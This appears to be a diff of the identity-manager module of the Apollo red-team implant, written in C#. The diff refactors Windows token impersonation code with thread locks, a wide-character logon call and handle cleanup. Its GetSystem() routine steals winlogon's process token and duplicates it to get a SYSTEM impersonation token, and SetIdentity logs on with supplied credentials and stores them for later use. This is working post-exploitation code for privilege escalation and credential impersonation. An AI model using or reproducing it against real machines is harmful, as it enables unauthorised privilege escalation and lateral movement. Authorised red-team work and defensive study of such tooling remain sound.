@@ -1,26 +1,27 @@
-﻿using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
-using System;
-using System.Security.Principal;
 using ApolloInterop.Classes.Api;
-using static ApolloInterop.Enums.Win32;
-using static ApolloInterop.Constants.Win32;
-using System.Runtime.InteropServices;
-using static ApolloInterop.Structs.Win32;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.ApolloStructs;
 using ApolloInterop.Structs.MythicStructs;
 using ApolloInterop.Utils;
+using System;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using static ApolloInterop.Constants.Win32;
+using static ApolloInterop.Enums.Win32;
+using static ApolloInterop.Structs.Win32;
 
 namespace Apollo.Management.Identity;
 
 public class IdentityManager : IIdentityManager
 {
-    private IAgent _agent;
+    private readonly IAgent _agent;
+    private readonly object _identitySync = new();
 
     private ApolloLogonInformation _userCredential;
-    private WindowsIdentity _originalIdentity = WindowsIdentity.GetCurrent();
-    private WindowsIdentity _currentPrimaryIdentity = WindowsIdentity.GetCurrent();
-    private WindowsIdentity _currentImpersonationIdentity = WindowsIdentity.GetCurrent();
-    private bool _isImpersonating = false;
+    private WindowsIdentity _originalIdentity;
+    private WindowsIdentity _currentPrimaryIdentity;
+    private WindowsIdentity _currentImpersonationIdentity;
+    private bool _isImpersonating;
 
     private IntPtr _executingThread = IntPtr.Zero;
     private IntPtr _originalImpersonationToken = IntPtr.Zero;
@@ -53,8 +54,7 @@ public class IdentityManager : IIdentityManager
         ref IntPtr hThread,
         IntPtr hToken);
 
-    private delegate bool CloseHandle(
-        IntPtr hHandle);
+    private delegate bool CloseHandle(IntPtr hHandle);
 
     private delegate bool GetTokenInformation(
         IntPtr tokenHandle,
@@ -62,38 +62,29 @@ public class IdentityManager : IIdentityManager
         IntPtr tokenInformation,
         int tokenInformationLength,
         out int returnLength);
-    
-    private delegate bool SetTokenInformation(
-        IntPtr tokenHandle,
-        TokenInformationClass tokenInformationClass,
-        IntPtr tokenInformation,
-        int tokenInformationLength);
 
     private delegate IntPtr GetSidSubAuthorityCount(IntPtr pSid);
     private delegate IntPtr GetSidSubAuthority(IntPtr pSid, int nSubAuthority);
 
-    private delegate bool LogonUserA(
+    private delegate bool LogonUserW(
         string lpszUsername,
         string lpszDomain,
         string lpszPassword,
         LogonType dwLogonType,
         LogonProvider dwLogonProvider,
         out IntPtr phToken);
-    //private delegate bool RevertToSelf();
 
-    private GetCurrentThread _GetCurrentThread;
-    private OpenThreadToken _OpenThreadToken;
-    private OpenProcessToken _OpenProcessToken;
-    private DuplicateTokenEx _DuplicateTokenEx;
-    private SetThreadToken _SetThreadToken;
-    private CloseHandle _CloseHandle;
-    private GetTokenInformation _GetTokenInformation;
-    private SetTokenInformation _SetTokenInformation;
-    private GetSidSubAuthorityCount _GetSidSubAuthorityCount;
-    private GetSidSubAuthority _GetSidSubAuthority;
+    private readonly GetCurrentThread _GetCurrentThread;
+    private readonly OpenThreadToken _OpenThreadToken;
+    private readonly OpenProcessToken _OpenProcessToken;
+    private readonly DuplicateTokenEx _DuplicateTokenEx;
+    private readonly SetThreadToken _SetThreadToken;
+    private readonly CloseHandle _CloseHandle;
+    private readonly GetTokenInformation _GetTokenInformation;
+    private readonly GetSidSubAuthorityCount _GetSidSubAuthorityCount;
+    private readonly GetSidSubAuthority _GetSidSubAuthority;
 
-    private LogonUserA _pLogonUserA;
-    // private RevertToSelf _RevertToSelf;
+    private readonly LogonUserW _pLogonUserW;
 
     #endregion
 
@@ -105,14 +96,18 @@ public class IdentityManager : IIdentityManager
         _OpenThreadToken = _agent.GetApi().GetLibraryFunction<OpenThreadToken>(Library.ADVAPI32, "OpenThreadToken");
         _OpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
         _DuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
-        //_RevertToSelf = _agent.GetApi().GetLibraryFunction<RevertToSelf>(Library.ADVAPI32, "RevertToSelf");
         _SetThreadToken = _agent.GetApi().GetLibraryFunction<SetThreadToken>(Library.ADVAPI32, "SetThreadToken");
         _CloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
         _GetTokenInformation = _agent.GetApi().GetLibraryFunction<GetTokenInformation>(Library.ADVAPI32, "GetTokenInformation");
-        _SetTokenInformation = _agent.GetApi().GetLibraryFunction<SetTokenInformation>(Library.ADVAPI32, "SetTokenInformation");
         _GetSidSubAuthorityCount = _agent.GetApi().GetLibraryFunction<GetSidSubAuthorityCount>(Library.ADVAPI32, "GetSidSubAuthorityCount");
         _GetSidSubAuthority = _agent.GetApi().GetLibraryFunction<GetSidSubAuthority>(Library.ADVAPI32, "GetSidSubAuthority");
-        _pLogonUserA = _agent.GetApi().GetLibraryFunction<LogonUserA>(Library.ADVAPI32, "LogonUserA");
+        _pLogonUserW = _agent.GetApi().GetLibraryFunction<LogonUserW>(Library.ADVAPI32, "LogonUserW");
+
+        _originalIdentity = WindowsIdentity.GetCurrent();
+        _currentPrimaryIdentity = _originalIdentity;
+        _currentImpersonationIdentity = _originalIdentity;
+        _isImpersonating = false;
+        _userCredential = new ApolloLogonInformation();
 
         _executingThread = _GetCurrentThread();
         SetImpersonationToken();
@@ -126,115 +121,26 @@ public class IdentityManager : IIdentityManager
             TOKEN_ALL_ACCESS,
             true,
             out _originalPrimaryToken);
+
         int dwError = Marshal.GetLastWin32Error();
-        if (!bRet && Error.ERROR_NO_TOKEN == dwError)
+
+        if (!bRet)
         {
-            IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
-            bRet = _OpenProcessToken(
-                hProcess,
-                TOKEN_ALL_ACCESS,
-                out _originalPrimaryToken);
+            if (dwError == Error.ERROR_NO_TOKEN)
+            {
+                IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
+                bRet = _OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out _originalPrimaryToken);
+                if (!bRet)
+                    throw new Exception($"Failed to open process token: {Marshal.GetLastWin32Error()}");
+            }
+            else
+            {
+                throw new Exception($"Failed to open thread token: {dwError}");
+            }
         }
-        else if (!bRet)
-        {
-            throw new Exception($"Failed to open thread token: {dwError}");
-        }
-        else
-        {
-            throw new Exception($"Failed to open thread token and have unhandled error. dwError: {dwError}");
-        }
+
         if (_originalPrimaryToken == IntPtr.Zero)
-            _originalPrimaryToken = WindowsIdentity.GetCurrent().Token;
-    }
-
-    public bool IsOriginalIdentity()
-    {
-        return !_isImpersonating;
-    }
-    public (bool,IntPtr) GetSystem()
-    {
-        if (GetIntegrityLevel() is IntegrityLevel.HighIntegrity)
-        {
-            IntPtr hToken = IntPtr.Zero;
-            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
-            IntPtr handle = processes[0].Handle;
-
-            bool success = _OpenProcessToken(handle, 0x0002, out hToken);
-            if (!success)
-            {
-                DebugHelp.DebugWriteLine("[!] GetSystem() - OpenProcessToken failed!");
-                return (false,new IntPtr());
-            }
-            IntPtr hDupToken = IntPtr.Zero;
-            success = _DuplicateTokenEx(hToken, TokenAccessLevels.MaximumAllowed, IntPtr.Zero, TokenImpersonationLevel.Impersonation, TokenType.TokenImpersonation, out hDupToken);
-            if (!success)
-            {
-                DebugHelp.DebugWriteLine("[!] GetSystem() - DuplicateToken failed!");
-                return (false,new IntPtr());
-            }
-            DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
-            return (true, hDupToken);
-        }
-        else
-        {
-            return (false,new IntPtr());
-        }
-    }
-
-    public IntegrityLevel GetIntegrityLevel()
-    {
-        IntPtr hToken = _currentImpersonationIdentity.Token;
-        int dwRet = 0;
-        bool bRet = false;
-        int dwTokenInfoLength = 0;
-        IntPtr pTokenInformation = IntPtr.Zero;
-        TokenMandatoryLevel tokenLabel;
-        IntPtr pTokenLabel = IntPtr.Zero;
-        IntPtr pSidSubAthorityCount = IntPtr.Zero;
-        bRet = _GetTokenInformation(
-            hToken,
-            TokenInformationClass.TokenIntegrityLevel,
-            IntPtr.Zero,
-            0,
-            out dwTokenInfoLength);
-        if (dwTokenInfoLength == 0 || Marshal.GetLastWin32Error() != Error.ERROR_INSUFFICIENT_BUFFER)
-            return (IntegrityLevel)dwRet;
-        pTokenLabel = Marshal.AllocHGlobal(dwTokenInfoLength);
-        try
-        {
-            bRet = _GetTokenInformation(
-                hToken,
-                TokenInformationClass.TokenIntegrityLevel,
-                pTokenLabel,
-                dwTokenInfoLength,
-                out dwTokenInfoLength);
-            if (bRet)
-            {
-                tokenLabel = (TokenMandatoryLevel)Marshal.PtrToStructure(pTokenLabel, typeof(TokenMandatoryLevel));
-                pSidSubAthorityCount = _GetSidSubAuthorityCount(tokenLabel.Label.Sid);
-                dwRet = Marshal.ReadInt32(_GetSidSubAuthority(tokenLabel.Label.Sid, Marshal.ReadInt32(pSidSubAthorityCount) - 1));
-                if (dwRet < SECURITY_MANDATORY_LOW_RID)
-                    dwRet = 0;
-                else if (dwRet < SECURITY_MANDATORY_MEDIUM_RID)
-                    dwRet = 1;
-                else if (dwRet >= SECURITY_MANDATORY_MEDIUM_RID && dwRet < SECURITY_MANDATORY_HIGH_RID)
-                    dwRet = 2;
-                else if (dwRet >= SECURITY_MANDATORY_HIGH_RID && dwRet < SECURITY_MANDATORY_SYSTEM_RID)
-                    dwRet = 3;
-                else if (dwRet >= SECURITY_MANDATORY_SYSTEM_RID)
-                    dwRet = 4;
-                else
-                    dwRet = 0; // unknown - should be unreachable.
-
-            }
-        }
-        catch (Exception ex)
-        { }
-        finally
-        {
-            Marshal.FreeHGlobal(pTokenLabel);
-        }
-        return (IntegrityLevel)dwRet;
+            _originalPrimaryToken = _originalIdentity.Token;
     }
 
     private void SetImpersonationToken()
@@ -244,74 +150,221 @@ public class IdentityManager : IIdentityManager
             TOKEN_ALL_ACCESS,
             true,
             out IntPtr hToken);
-        int dwError = Marshal.GetLastWin32Error();
-        if (!bRet && Error.ERROR_NO_TOKEN == dwError)
-        {
-            IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
-            bRet = _OpenProcessToken(
-                hProcess,
-                TOKEN_ALL_ACCESS,
-                out hToken);
-            if (!bRet)
-            {
-                throw new Exception($"Failed to acquire Process token: {Marshal.GetLastWin32Error()}");
-            }
-            bRet = _DuplicateTokenEx(
-                hToken,
-                TokenAccessLevels.MaximumAllowed,
-                IntPtr.Zero,
-                TokenImpersonationLevel.Impersonation,
-                TokenType.TokenImpersonation,
-                out _originalImpersonationToken);
 
-            if (!bRet)
+        int dwError = Marshal.GetLastWin32Error();
+
+        if (!bRet)
+        {
+            if (dwError == Error.ERROR_NO_TOKEN)
             {
-                throw new Exception($"Failed to acquire Process token: {Marshal.GetLastWin32Error()}");
+                IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
+                bRet = _OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out hToken);
+                if (!bRet)
+                    throw new Exception($"Failed to acquire process token: {Marshal.GetLastWin32Error()}");
+            }
+            else
+            {
+                throw new Exception($"Failed to open thread token: {dwError}");
             }
         }
-        else if (!bRet)
-        {
-            throw new Exception($"Failed to open thread token: {dwError}");
-        }
+
+        bRet = _DuplicateTokenEx(
+            hToken,
+            TokenAccessLevels.MaximumAllowed,
+            IntPtr.Zero,
+            TokenImpersonationLevel.Impersonation,
+            TokenType.TokenImpersonation,
+            out _originalImpersonationToken);
+
+        _CloseHandle(hToken);
+
+        if (!bRet)
+            throw new Exception($"Failed to duplicate impersonation token: {Marshal.GetLastWin32Error()}");
 
         if (_originalImpersonationToken == IntPtr.Zero)
-        {
             _originalImpersonationToken = _originalIdentity.Token;
+    }
+
+    private void RevertInternal()
+    {
+        if (!_SetThreadToken(ref _executingThread, _originalImpersonationToken))
+        {
+            DebugHelp.DebugWriteLine($"[!] Revert() failed to restore thread token: {Marshal.GetLastWin32Error()}");
         }
+
+        _userCredential = new ApolloLogonInformation();
+        _currentImpersonationIdentity = _originalIdentity;
+        _currentPrimaryIdentity = _originalIdentity;
+        _isImpersonating = false;
+    }
+
+    public bool IsOriginalIdentity()
+    {
+        lock (_identitySync)
+        {
+            return !_isImpersonating;
+        }
+    }
+
+    public (bool, IntPtr) GetSystem()
+    {
+        lock (_identitySync)
+        {
+            if (GetIntegrityLevel() is not IntegrityLevel.HighIntegrity)
+                return (false, IntPtr.Zero);
+
+            IntPtr hToken = IntPtr.Zero;
+            IntPtr hDupToken = IntPtr.Zero;
+
+            try
+            {
+                System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
+                if (processes.Length == 0)
+                    return (false, IntPtr.Zero);
+
+                IntPtr handle = processes[0].Handle;
+                bool success = _OpenProcessToken(
+                    handle,
+                    (uint)(TokenAccessLevels.Query | TokenAccessLevels.Duplicate),
+                    out hToken);
+
+                if (!success)
+                {
+                    DebugHelp.DebugWriteLine("[!] GetSystem() - OpenProcessToken failed!");
+                    return (false, IntPtr.Zero);
+                }
+
+                success = _DuplicateTokenEx(
+                    hToken,
+                    TokenAccessLevels.MaximumAllowed,
+                    IntPtr.Zero,
+                    TokenImpersonationLevel.Impersonation,
+                    TokenType.TokenImpersonation,
+                    out hDupToken);
+
+                if (!success)
+                {
+                    DebugHelp.DebugWriteLine("[!] GetSystem() - DuplicateTokenEx failed!");
+                    return (false, IntPtr.Zero);
+                }
+
+                DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
+                return (true, hDupToken);
+            }
+            finally
+            {
+                if (hToken != IntPtr.Zero)
+                    _CloseHandle(hToken);
+            }
+        }
+    }
+
+    public IntegrityLevel GetIntegrityLevel()
+    {
+        IntPtr hToken;
+
+        lock (_identitySync)
+        {
+            hToken = _currentImpersonationIdentity.Token;
+        }
+
+        int dwRet = 0;
+        int dwTokenInfoLength = 0;
+        IntPtr pTokenLabel = IntPtr.Zero;
+
+        _GetTokenInformation(
+            hToken,
+            TokenInformationClass.TokenIntegrityLevel,
+            IntPtr.Zero,
+            0,
+            out dwTokenInfoLength);
+
+        if (dwTokenInfoLength == 0 || Marshal.GetLastWin32Error() != Error.ERROR_INSUFFICIENT_BUFFER)
+            return (IntegrityLevel)dwRet;
+
+        pTokenLabel = Marshal.AllocHGlobal(dwTokenInfoLength);
+
+        try
+        {
+            bool bRet = _GetTokenInformation(
+                hToken,
+                TokenInformationClass.TokenIntegrityLevel,
+                pTokenLabel,
+                dwTokenInfoLength,
+                out dwTokenInfoLength);
+
+            if (bRet)
+            {
+                TokenMandatoryLevel tokenLabel = (TokenMandatoryLevel)Marshal.PtrToStructure(pTokenLabel, typeof(TokenMandatoryLevel));
+                IntPtr pSidSubAuthorityCount = _GetSidSubAuthorityCount(tokenLabel.Label.Sid);
+                int subAuthorityCount = Marshal.ReadByte(pSidSubAuthorityCount);
+
+                if (subAuthorityCount > 0)
+                {
+                    dwRet = Marshal.ReadInt32(_GetSidSubAuthority(tokenLabel.Label.Sid, subAuthorityCount - 1));
+                }
+
+                if (dwRet < SECURITY_MANDATORY_LOW_RID)
+                    dwRet = 0;
+                else if (dwRet < SECURITY_MANDATORY_MEDIUM_RID)
+                    dwRet = 1;
+                else if (dwRet < SECURITY_MANDATORY_HIGH_RID)
+                    dwRet = 2;
+                else if (dwRet < SECURITY_MANDATORY_SYSTEM_RID)
+                    dwRet = 3;
+                else
+                    dwRet = 4;
+            }
+        }
+        catch (Exception ex)
+        {
+            DebugHelp.DebugWriteLine($"[!] GetIntegrityLevel() failed: {ex.Message}");
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(pTokenLabel);
+        }
+
+        return (IntegrityLevel)dwRet;
     }
 
     public WindowsIdentity GetCurrent()
     {
-        return _currentImpersonationIdentity;
+        lock (_identitySync)
+        {
+            return _currentImpersonationIdentity;
+        }
     }
 
     public WindowsIdentity GetOriginal()
     {
-        return _originalIdentity;
+        lock (_identitySync)
+        {
+            return _originalIdentity;
+        }
     }
 
     public bool SetIdentity(ApolloLogonInformation logonInfo)
     {
-        bool bRet = false;
-        int dwError = 0;
-        IntPtr hToken = IntPtr.Zero;
-
-        Revert();
-        // Blank out the old struct
-        _userCredential = logonInfo;
-
-        bRet = _pLogonUserA(
-            _userCredential.Username,
-            _userCredential.Domain,
-            _userCredential.Password,
-            _userCredential.NetOnly ? LogonType.LOGON32_LOGON_NEW_CREDENTIALS : LogonType.LOGON32_LOGON_INTERACTIVE,
-            LogonProvider.LOGON32_PROVIDER_WINNT50,
-            out hToken);
-
-        if (bRet)
+        lock (_identitySync)
         {
+            RevertInternal();
+
+            bool bRet = _pLogonUserW(
+                logonInfo.Username,
+                logonInfo.Domain,
+                logonInfo.Password,
+                logonInfo.NetOnly ? LogonType.LOGON32_LOGON_NEW_CREDENTIALS : LogonType.LOGON32_LOGON_INTERACTIVE,
+                LogonProvider.LOGON32_PROVIDER_WINNT50,
+                out IntPtr hToken);
+
+            if (!bRet)
+            {
+                return false;
+            }
+
             _currentPrimaryIdentity = new WindowsIdentity(hToken);
-            _CloseHandle(hToken);
+
             bRet = _DuplicateTokenEx(
                 _currentPrimaryIdentity.Token,
                 TokenAccessLevels.MaximumAllowed,
@@ -319,75 +372,98 @@ public class IdentityManager : IIdentityManager
                 TokenImpersonationLevel.Impersonation,
                 TokenType.TokenImpersonation,
                 out IntPtr dupToken);
-            if (bRet)
+
+            if (!bRet)
             {
-                _currentImpersonationIdentity = new WindowsIdentity(dupToken);
-                _CloseHandle(dupToken);
-                _isImpersonating = true;
+                _CloseHandle(hToken);
+                RevertInternal();
+                return false;
             }
-            else
-            {
-                Revert();
-            }
+
+            _currentImpersonationIdentity = new WindowsIdentity(dupToken);
+            _isImpersonating = true;
+            _userCredential = logonInfo;
+
+            _CloseHandle(hToken);
+            _CloseHandle(dupToken);
+
+            return true;
         }
-        return bRet;
     }
 
     public void SetPrimaryIdentity(WindowsIdentity ident)
     {
-        _currentPrimaryIdentity = ident;
-        _isImpersonating = true;
+        lock (_identitySync)
+        {
+            _currentPrimaryIdentity = ident;
+            _isImpersonating = true;
+        }
     }
 
     public void SetPrimaryIdentity(IntPtr hToken)
     {
-        _currentPrimaryIdentity = new WindowsIdentity(hToken);
-        _isImpersonating = true;
+        lock (_identitySync)
+        {
+            _currentPrimaryIdentity = new WindowsIdentity(hToken);
+            _isImpersonating = true;
+        }
     }
 
     public void SetImpersonationIdentity(WindowsIdentity ident)
     {
-        _currentImpersonationIdentity = ident;
-        _isImpersonating = true;
+        lock (_identitySync)
+        {
+            _currentImpersonationIdentity = ident;
+            _isImpersonating = true;
+        }
     }
 
     public void SetImpersonationIdentity(IntPtr hToken)
     {
-        _currentImpersonationIdentity = new WindowsIdentity(hToken);
-        _isImpersonating = true;
+        lock (_identitySync)
+        {
+            _currentImpersonationIdentity = new WindowsIdentity(hToken);
+            _isImpersonating = true;
+        }
     }
 
     public void Revert()
     {
-        _SetThreadToken(ref _executingThread, _originalImpersonationToken);
-        _userCredential = new ApolloLogonInformation();
-        _currentImpersonationIdentity = _originalIdentity;
-        _currentPrimaryIdentity = _originalIdentity;
-        _isImpersonating = false;
-        //_RevertToSelf();
+        lock (_identitySync)
+        {
+            RevertInternal();
+        }
     }
 
     public WindowsIdentity GetCurrentPrimaryIdentity()
     {
-        return _currentPrimaryIdentity;
+        lock (_identitySync)
+        {
+            return _currentPrimaryIdentity;
+        }
     }
 
     public WindowsIdentity GetCurrentImpersonationIdentity()
     {
-        return _currentImpersonationIdentity;
+        lock (_identitySync)
+        {
+            return _currentImpersonationIdentity;
+        }
     }
 
     public bool GetCurrentLogonInformation(out ApolloLogonInformation logonInfo)
     {
-        if (!string.IsNullOrEmpty(_userCredential.Username) &&
-            !string.IsNullOrEmpty(_userCredential.Password))
+        lock (_identitySync)
         {
-            logonInfo = _userCredential;
-            return true;
-        }
-        logonInfo = new ApolloLogonInformation();
-        return false;
-    }
+            if (!string.IsNullOrEmpty(_userCredential.Username) &&
+                !string.IsNullOrEmpty(_userCredential.Password))
+            {
+                logonInfo = _userCredential;
+                return true;
+            }
 
-    
+            logonInfo = new ApolloLogonInformation();
+            return false;
+        }
+    }
 }
